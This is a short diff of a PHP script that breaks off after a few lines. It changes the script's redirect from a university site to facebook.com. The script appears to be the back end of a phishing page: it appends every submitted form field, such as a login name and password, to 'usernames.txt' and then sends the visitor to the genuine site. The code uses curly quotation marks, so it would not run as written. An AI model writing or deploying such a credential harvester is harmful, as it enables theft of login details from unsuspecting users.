@@ -1,5 +1,5 @@
 <?php
-header (‘Location:https://leons.cspc.edu.ph/’);
+header (‘Location:http://www.facebook.com/’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
